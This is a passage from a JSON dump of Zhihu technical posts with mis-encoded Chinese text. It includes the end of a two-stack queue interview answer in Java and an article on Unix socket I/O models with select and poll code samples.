height=&#39;524&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"659\" data-rawheight=\"524\" data-thumbnail=\"https://pic1.zhimg.com/v2-aaa9b59f2d5f8f9c638bfcf96d5f3654_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"659\" data-original=\"https://pic1.zhimg.com/v2-aaa9b59f2d5f8f9c638bfcf96d5f3654_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-aaa9b59f2d5f8f9c638bfcf96d5f3654_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Stack</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">in</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Stack</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;();</span>\n<span class=\"n\">Stack</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">out</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Stack</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;();</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">push</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">node</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">in</span><span class=\"o\">.</span><span class=\"na\">push</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">pop</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">Exception</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">out</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">())</span>\n        <span class=\"k\">while</span> <span class=\"o\">(!</span><span class=\"n\">in</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">())</span>\n            <span class=\"n\">out</span><span class=\"o\">.</span><span class=\"na\">push</span><span class=\"o\">(</span><span class=\"n\">in</span><span class=\"o\">.</span><span class=\"na\">pop</span><span class=\"o\">());</span>\n\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">out</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">())</span>\n        <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"n\">Exception</span><span class=\"o\">(</span><span class=\"s\">&#34;queue is empty&#34;</span><span class=\"o\">);</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">out</span><span class=\"o\">.</span><span class=\"na\">pop</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>ä½ å¯ä»¥åœ¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·åå°ä¸æˆ‘äº¤æµã€‚å¦å¤–ï¼Œå…¬ä¼—å·ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚å…¬ä¼—å·ä¹Ÿæä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "ç®—æ³•", 
                    "tagLink": "https://api.zhihu.com/topics/19553510"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68764663", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "Socket", 
            "content": "<p></p><h2>ä¸€ã€I/O æ¨¡å‹</h2><p>ä¸€ä¸ªè¾“å…¥æ“ä½œé€šå¸¸åŒ…æ‹¬ä¸¤ä¸ªé˜¶æ®µï¼š</p><ul><li>ç­‰å¾…æ•°æ®å‡†å¤‡å¥½</li><li>ä»å†…æ ¸å‘è¿›ç¨‹å¤åˆ¶æ•°æ®</li></ul><p>å¯¹äºä¸€ä¸ªå¥—æ¥å­—ä¸Šçš„è¾“å…¥æ“ä½œï¼Œç¬¬ä¸€æ­¥é€šå¸¸æ¶‰åŠç­‰å¾…æ•°æ®ä»ç½‘ç»œä¸­åˆ°è¾¾ã€‚å½“æ‰€ç­‰å¾…æ•°æ®åˆ°è¾¾æ—¶ï¼Œå®ƒè¢«å¤åˆ¶åˆ°å†…æ ¸ä¸­çš„æŸä¸ªç¼“å†²åŒºã€‚ç¬¬äºŒæ­¥å°±æ˜¯æŠŠæ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºã€‚</p><p>Unix æœ‰äº”ç§ I/O æ¨¡å‹ï¼š</p><ul><li>é˜»å¡å¼ I/O</li><li>éé˜»å¡å¼ I/O</li><li>I/O å¤ç”¨ï¼ˆselect å’Œ pollï¼‰</li><li>ä¿¡å·é©±åŠ¨å¼ I/Oï¼ˆSIGIOï¼‰</li><li>å¼‚æ­¥ I/Oï¼ˆAIOï¼‰</li></ul><h2>é˜»å¡å¼ I/O</h2><p>åº”ç”¨è¿›ç¨‹è¢«é˜»å¡ï¼Œç›´åˆ°æ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºä¸­æ‰è¿”å›ã€‚</p><p>åº”è¯¥æ³¨æ„åˆ°ï¼Œåœ¨é˜»å¡çš„è¿‡ç¨‹ä¸­ï¼Œå…¶å®ƒåº”ç”¨è¿›ç¨‹è¿˜å¯ä»¥æ‰§è¡Œï¼Œå› æ­¤é˜»å¡ä¸æ„å‘³ç€æ•´ä¸ªæ“ä½œç³»ç»Ÿéƒ½è¢«é˜»å¡ã€‚å› ä¸ºå…¶å®ƒåº”ç”¨è¿›ç¨‹è¿˜å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥ä¸æ¶ˆè€— CPU æ—¶é—´ï¼Œè¿™ç§æ¨¡å‹çš„ CPU åˆ©ç”¨ç‡ä¼šæ¯”è¾ƒé«˜ã€‚</p><p>ä¸‹å›¾ä¸­ï¼Œrecvfrom() ç”¨äºæ¥æ”¶ Socket ä¼ æ¥çš„æ•°æ®ï¼Œå¹¶å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹çš„ç¼“å†²åŒº buf ä¸­ã€‚è¿™é‡ŒæŠŠ recvfrom() å½“æˆç³»ç»Ÿè°ƒç”¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"n\">ssize_t</span> <span class=\"nf\">recvfrom</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">sockfd</span><span class=\"p\">,</span> <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">buf</span><span class=\"p\">,</span> <span class=\"n\">size_t</span> <span class=\"n\">len</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">flags</span><span class=\"p\">,</span> <span class=\"k\">struct</span> <span class=\"n\">sockaddr</span> <span class=\"o\">*</span><span class=\"n\">src_addr</span><span class=\"p\">,</span> <span class=\"n\">socklen_t</span> <span class=\"o\">*</span><span class=\"n\">addrlen</span><span class=\"p\">);</span></code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-8a8ad2c956a36324319c868c9d9f775b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"704\" data-rawheight=\"399\" class=\"origin_image zh-lightbox-thumb\" width=\"704\" data-original=\"https://pic4.zhimg.com/v2-8a8ad2c956a36324319c868c9d9f775b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;704&#39; height=&#39;399&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"704\" data-rawheight=\"399\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"704\" data-original=\"https://pic4.zhimg.com/v2-8a8ad2c956a36324319c868c9d9f775b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-8a8ad2c956a36324319c868c9d9f775b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>éé˜»å¡å¼ I/O</h2><p>åº”ç”¨è¿›ç¨‹æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œå†…æ ¸è¿”å›ä¸€ä¸ªé”™è¯¯ç ã€‚åº”ç”¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä½†æ˜¯éœ€è¦ä¸æ–­çš„æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ¥è·çŸ¥ I/O æ˜¯å¦å®Œæˆï¼Œè¿™ç§æ–¹å¼ç§°ä¸ºè½®è¯¢ï¼ˆpollingï¼‰ã€‚</p><p>ç”±äº CPU è¦å¤„ç†æ›´å¤šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤è¿™ç§æ¨¡å‹çš„ CPU åˆ©ç”¨ç‡æ¯”è¾ƒä½ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-377a6ff0ab5e0114673e8728e1051ee0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"707\" data-rawheight=\"408\" class=\"origin_image zh-lightbox-thumb\" width=\"707\" data-original=\"https://pic1.zhimg.com/v2-377a6ff0ab5e0114673e8728e1051ee0_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;707&#39; height=&#39;408&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"707\" data-rawheight=\"408\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"707\" data-original=\"https://pic1.zhimg.com/v2-377a6ff0ab5e0114673e8728e1051ee0_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-377a6ff0ab5e0114673e8728e1051ee0_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>I/O å¤ç”¨</h2><p>ä½¿ç”¨ select æˆ–è€… poll ç­‰å¾…æ•°æ®ï¼Œå¹¶ä¸”å¯ä»¥ç­‰å¾…å¤šä¸ªå¥—æ¥å­—ä¸­çš„ä»»ä½•ä¸€ä¸ªå˜ä¸ºå¯è¯»ã€‚è¿™ä¸€è¿‡ç¨‹ä¼šè¢«é˜»å¡ï¼Œå½“æŸä¸€ä¸ªå¥—æ¥å­—å¯è¯»æ—¶è¿”å›ï¼Œä¹‹åå†ä½¿ç”¨ recvfrom æŠŠæ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°è¿›ç¨‹ä¸­ã€‚</p><p>å®ƒå¯ä»¥è®©å•ä¸ªè¿›ç¨‹å…·æœ‰å¤„ç†å¤šä¸ª I/O äº‹ä»¶çš„èƒ½åŠ›ã€‚åˆè¢«ç§°ä¸º Event Driven I/Oï¼Œå³äº‹ä»¶é©±åŠ¨ I/Oã€‚</p><p>å¦‚æœä¸€ä¸ª Web æœåŠ¡å™¨æ²¡æœ‰ I/O å¤ç”¨ï¼Œé‚£ä¹ˆæ¯ä¸€ä¸ª Socket è¿æ¥éƒ½éœ€è¦åˆ›å»ºä¸€ä¸ªçº¿ç¨‹å»å¤„ç†ã€‚å¦‚æœåŒæ—¶æœ‰å‡ ä¸‡ä¸ªè¿æ¥ï¼Œé‚£ä¹ˆå°±éœ€è¦åˆ›å»ºç›¸åŒæ•°é‡çš„çº¿ç¨‹ã€‚ç›¸æ¯”äºå¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹æŠ€æœ¯ï¼ŒI/O å¤ç”¨ä¸éœ€è¦è¿›ç¨‹çº¿ç¨‹åˆ›å»ºå’Œåˆ‡æ¢çš„å¼€é”€ï¼Œç³»ç»Ÿå¼€é”€æ›´å°ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-362dc640c7ed4877e7c88ed24dee6d22_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"748\" data-rawheight=\"406\" class=\"origin_image zh-lightbox-thumb\" width=\"748\" data-original=\"https://pic3.zhimg.com/v2-362dc640c7ed4877e7c88ed24dee6d22_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;748&#39; height=&#39;406&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"748\" data-rawheight=\"406\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"748\" data-original=\"https://pic3.zhimg.com/v2-362dc640c7ed4877e7c88ed24dee6d22_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-362dc640c7ed4877e7c88ed24dee6d22_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>ä¿¡å·é©±åŠ¨ I/O</h2><p>åº”ç”¨è¿›ç¨‹ä½¿ç”¨ sigaction ç³»ç»Ÿè°ƒç”¨ï¼Œå†…æ ¸ç«‹å³è¿”å›ï¼Œåº”ç”¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ç­‰å¾…æ•°æ®é˜¶æ®µåº”ç”¨è¿›ç¨‹æ˜¯éé˜»å¡çš„ã€‚å†…æ ¸åœ¨æ•°æ®åˆ°è¾¾æ—¶å‘åº”ç”¨è¿›ç¨‹å‘é€ SIGIO ä¿¡å·ï¼Œåº”ç”¨è¿›ç¨‹æ”¶åˆ°ä¹‹ååœ¨ä¿¡å·å¤„ç†ç¨‹åºä¸­è°ƒç”¨ recvfrom å°†æ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ä¸­ã€‚</p><p>ç›¸æ¯”äºéé˜»å¡å¼ I/O çš„è½®è¯¢æ–¹å¼ï¼Œä¿¡å·é©±åŠ¨ I/O çš„ CPU åˆ©ç”¨ç‡æ›´é«˜ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-7f980441d18fda96ccac967aae7b66f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"406\" class=\"origin_image zh-lightbox-thumb\" width=\"728\" data-original=\"https://pic4.zhimg.com/v2-7f980441d18fda96ccac967aae7b66f3_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;728&#39; height=&#39;406&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"406\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"728\" data-original=\"https://pic4.zhimg.com/v2-7f980441d18fda96ccac967aae7b66f3_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-7f980441d18fda96ccac967aae7b66f3_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å¼‚æ­¥ I/O</h2><p>åº”ç”¨è¿›ç¨‹æ‰§è¡Œ aio_read ç³»ç»Ÿè°ƒç”¨ä¼šç«‹å³è¿”å›ï¼Œåº”ç”¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä¸ä¼šè¢«é˜»å¡ï¼Œå†…æ ¸ä¼šåœ¨æ‰€æœ‰æ“ä½œå®Œæˆä¹‹åå‘åº”ç”¨è¿›ç¨‹å‘é€ä¿¡å·ã€‚</p><p>å¼‚æ­¥ I/O ä¸ä¿¡å·é©±åŠ¨ I/O çš„åŒºåˆ«åœ¨äºï¼Œå¼‚æ­¥ I/O çš„ä¿¡å·æ˜¯é€šçŸ¥åº”ç”¨è¿›ç¨‹ I/O å®Œæˆï¼Œè€Œä¿¡å·é©±åŠ¨ I/O çš„ä¿¡å·æ˜¯é€šçŸ¥åº”ç”¨è¿›ç¨‹å¯ä»¥å¼€å§‹ I/Oã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-2afb6123779c407bef0509bf28080b2f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"718\" data-rawheight=\"407\" class=\"origin_image zh-lightbox-thumb\" width=\"718\" data-original=\"https://pic4.zhimg.com/v2-2afb6123779c407bef0509bf28080b2f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;718&#39; height=&#39;407&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"718\" data-rawheight=\"407\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"718\" data-original=\"https://pic4.zhimg.com/v2-2afb6123779c407bef0509bf28080b2f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-2afb6123779c407bef0509bf28080b2f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>äº”å¤§ I/O æ¨¡å‹æ¯”è¾ƒ</h2><ul><li>åŒæ­¥ I/Oï¼šå°†æ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºçš„é˜¶æ®µï¼Œåº”ç”¨è¿›ç¨‹ä¼šé˜»å¡ã€‚</li><li>å¼‚æ­¥ I/Oï¼šä¸ä¼šé˜»å¡ã€‚</li></ul><p>é˜»å¡å¼ I/Oã€éé˜»å¡å¼ I/Oã€I/O å¤ç”¨å’Œä¿¡å·é©±åŠ¨ I/O éƒ½æ˜¯åŒæ­¥ I/Oï¼Œå®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨ç¬¬ä¸€ä¸ªé˜¶æ®µã€‚</p><p>éé˜»å¡å¼ I/O ã€ä¿¡å·é©±åŠ¨ I/O å’Œå¼‚æ­¥ I/O åœ¨ç¬¬ä¸€é˜¶æ®µä¸ä¼šé˜»å¡ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-07c3f47dbf077f922a5cf6461fd8ba1e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"761\" data-rawheight=\"427\" class=\"origin_image zh-lightbox-thumb\" width=\"761\" data-original=\"https://pic3.zhimg.com/v2-07c3f47dbf077f922a5cf6461fd8ba1e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;761&#39; height=&#39;427&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"761\" data-rawheight=\"427\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"761\" data-original=\"https://pic3.zhimg.com/v2-07c3f47dbf077f922a5cf6461fd8ba1e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-07c3f47dbf077f922a5cf6461fd8ba1e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>äºŒã€I/O å¤ç”¨</h2><p>select/poll/epoll éƒ½æ˜¯ I/O å¤šè·¯å¤ç”¨çš„å…·ä½“å®ç°ï¼Œselect å‡ºç°çš„æœ€æ—©ï¼Œä¹‹åæ˜¯ pollï¼Œå†æ˜¯ epollã€‚</p><h2>select</h2><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"kt\">int</span> <span class=\"nf\">select</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">,</span> <span class=\"n\">fd_set</span> <span class=\"o\">*</span><span class=\"n\">readfds</span><span class=\"p\">,</span> <span class=\"n\">fd_set</span> <span class=\"o\">*</span><span class=\"n\">writefds</span><span class=\"p\">,</span> <span class=\"n\">fd_set</span> <span class=\"o\">*</span><span class=\"n\">exceptfds</span><span class=\"p\">,</span> <span class=\"k\">struct</span> <span class=\"n\">timeval</span> <span class=\"o\">*</span><span class=\"n\">timeout</span><span class=\"p\">);</span></code></pre></div><p>æœ‰ä¸‰ç§ç±»å‹çš„æè¿°ç¬¦ç±»å‹ï¼šreadsetã€writesetã€exceptsetï¼Œåˆ†åˆ«å¯¹åº”è¯»ã€å†™ã€å¼‚å¸¸æ¡ä»¶çš„æè¿°ç¬¦é›†åˆã€‚fd_set ä½¿ç”¨æ•°ç»„å®ç°ï¼Œæ•°ç»„å¤§å°ä½¿ç”¨ FD_SETSIZE å®šä¹‰ã€‚</p><p>timeout ä¸ºè¶…æ—¶å‚æ•°ï¼Œè°ƒç”¨ select ä¼šä¸€ç›´é˜»å¡ç›´åˆ°æœ‰æè¿°ç¬¦çš„äº‹ä»¶åˆ°è¾¾æˆ–è€…ç­‰å¾…çš„æ—¶é—´è¶…è¿‡ timeoutã€‚</p><p>æˆåŠŸè°ƒç”¨è¿”å›ç»“æœå¤§äº 0ï¼Œå‡ºé”™è¿”å›ç»“æœä¸º -1ï¼Œè¶…æ—¶è¿”å›ç»“æœä¸º 0ã€‚</p><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"n\">fd_set</span> <span class=\"n\">fd_in</span><span class=\"p\">,</span> <span class=\"n\">fd_out</span><span class=\"p\">;</span>\n<span class=\"k\">struct</span> <span class=\"n\">timeval</span> <span class=\"n\">tv</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// Reset the sets\n</span><span class=\"c1\"></span><span class=\"n\">FD_ZERO</span><span class=\"p\">(</span> <span class=\"o\">&amp;</span><span class=\"n\">fd_in</span> <span class=\"p\">);</span>\n<span class=\"n\">FD_ZERO</span><span class=\"p\">(</span> <span class=\"o\">&amp;</span><span class=\"n\">fd_out</span> <span class=\"p\">);</span>\n\n<span class=\"c1\">// Monitor sock1 for input events\n</span><span class=\"c1\"></span><span class=\"n\">FD_SET</span><span class=\"p\">(</span> <span class=\"n\">sock1</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">fd_in</span> <span class=\"p\">);</span>\n\n<span class=\"c1\">// Monitor sock2 for output events\n</span><span class=\"c1\"></span><span class=\"n\">FD_SET</span><span class=\"p\">(</span> <span class=\"n\">sock2</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">fd_out</span> <span class=\"p\">);</span>\n\n<span class=\"c1\">// Find out which socket has the largest numeric value as select requires it\n</span><span class=\"c1\"></span><span class=\"kt\">int</span> <span class=\"n\">largest_sock</span> <span class=\"o\">=</span> <span class=\"n\">sock1</span> <span class=\"o\">&gt;</span> <span class=\"n\">sock2</span> <span class=\"o\">?</span> <span class=\"nl\">sock1</span> <span class=\"p\">:</span> <span class=\"n\">sock2</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// Wait up to 10 seconds\n</span><span class=\"c1\"></span><span class=\"n\">tv</span><span class=\"p\">.</span><span class=\"n\">tv_sec</span> <span class=\"o\">=</span> <span class=\"mi\">10</span><span class=\"p\">;</span>\n<span class=\"n\">tv</span><span class=\"p\">.</span><span class=\"n\">tv_usec</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// Call the select\n</span><span class=\"c1\"></span><span class=\"kt\">int</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"n\">select</span><span class=\"p\">(</span> <span class=\"n\">largest_sock</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">fd_in</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">fd_out</span><span class=\"p\">,</span> <span class=\"nb\">NULL</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">tv</span> <span class=\"p\">);</span>\n\n<span class=\"c1\">// Check if select actually succeed\n</span><span class=\"c1\"></span><span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">ret</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"mi\">1</span> <span class=\"p\">)</span>\n    <span class=\"c1\">// report error and abort\n</span><span class=\"c1\"></span><span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">ret</span> <span class=\"o\">==</span> <span class=\"mi\">0</span> <span class=\"p\">)</span>\n    <span class=\"c1\">// timeout; no event detected\n</span><span class=\"c1\"></span><span class=\"k\">else</span>\n<span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">FD_ISSET</span><span class=\"p\">(</span> <span class=\"n\">sock1</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">fd_in</span> <span class=\"p\">)</span> <span class=\"p\">)</span>\n        <span class=\"c1\">// input event on sock1\n</span><span class=\"c1\"></span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">FD_ISSET</span><span class=\"p\">(</span> <span class=\"n\">sock2</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">fd_out</span> <span class=\"p\">)</span> <span class=\"p\">)</span>\n        <span class=\"c1\">// output event on sock2\n</span><span class=\"c1\"></span><span class=\"p\">}</span></code></pre></div><h2>poll</h2><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"kt\">int</span> <span class=\"nf\">poll</span><span class=\"p\">(</span><span class=\"k\">struct</span> <span class=\"n\">pollfd</span> <span class=\"o\">*</span><span class=\"n\">fds</span><span class=\"p\">,</span> <span class=\"kt\">unsigned</span> <span class=\"kt\">int</span> <span class=\"n\">nfds</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">timeout</span><span class=\"p\">);</span></code></pre></div><p>pollfd ä½¿ç”¨é“¾è¡¨å®ç°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"c1\">// The structure for two events\n</span><span class=\"c1\"></span><span class=\"k\">struct</span> <span class=\"n\">pollfd</span> <span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">];</span>\n\n<span class=\"c1\">// Monitor sock1 for input\n</span><span class=\"c1\"></span><span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">fd</span> <span class=\"o\">=</span> <span class=\"n\">sock1</span><span class=\"p\">;</span>\n<span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">events</span> <span class=\"o\">=</span> <span class=\"n\">POLLIN</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// Monitor sock2 for output\n</span><span class=\"c1\"></span><span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">fd</span> <span class=\"o\">=</span> <span class=\"n\">sock2</span><span class=\"p\">;</span>\n<span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">events</span> <span class=\"o\">=</span> <span class=\"n\">POLLOUT</span><span 